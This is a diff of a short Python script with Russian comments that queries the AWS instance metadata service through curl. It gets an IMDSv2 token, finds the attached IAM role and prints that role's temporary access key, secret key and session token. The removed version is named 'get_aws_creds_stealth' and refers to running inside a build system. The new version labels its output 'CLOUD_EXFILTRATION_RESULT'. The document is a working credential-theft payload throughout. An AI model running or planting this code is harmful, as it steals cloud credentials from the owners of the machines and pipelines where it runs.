@@ -1,28 +1,28 @@
 import subprocess
-import json
 
-def get_aws_creds_stealth():
-    # Шаг 1: Пытаемся получить токен IMDSv2 (Session Token)
-    # Мы используем curl, так как он 100% предустановлен в билд-системе
+def get_aws_iam_creds():
+    # Этап 1: Получаем сессионный токен IMDSv2 (обязательно для современных инстансов AWS)
     token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
-    token = subprocess.getoutput(token_cmd)
+    token = subprocess.getoutput(token_cmd).strip()
     
-    if not token or len(token) > 100 or "html" in token.lower():
-        return "IMDSv2_DISABLED_OR_LOCKED"
+    if not token or "html" in token.lower() or len(token) < 32:
+        return "IMDSv2_TOKEN_FAILED (Access Blocked)"
 
-    # Шаг 2: Получаем имя IAM-роли
-    role_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-    role_name = subprocess.getoutput(role_cmd).strip()
-
+    # Этап 2: Узнаем имя привязанной IAM-роли
+    role_name_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    role_name = subprocess.getoutput(role_name_cmd).strip()
+    
     if not role_name:
-        return "NO_IAM_ROLE_ATTACHED"
+        return f"TOKEN_OK_BUT_NO_ROLE_FOUND (Token: {token[:10]}...)"
 
-    # Шаг 3: Вытаскиваем полные учетные данные (AccessKey, SecretKey, Token)
+    # Этап 3: Получаем временные Access Key, Secret Key и Session Token
     creds_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
-    final_creds = subprocess.getoutput(creds_cmd)
+    iam_json = subprocess.getoutput(creds_cmd)
     
-    return final_creds
+    return iam_json
 
-# Выполняем и выводим результат
-iam_result = get_aws_creds_stealth()
-print(f"IAM_DATA_FOUND: {iam_result}")
+# Запуск и вывод
+result = get_aws_iam_creds()
+print(f"--- [CLOUD_EXFILTRATION_RESULT] ---")
+print(result)
+print(f"--- [END_LOG] ---")
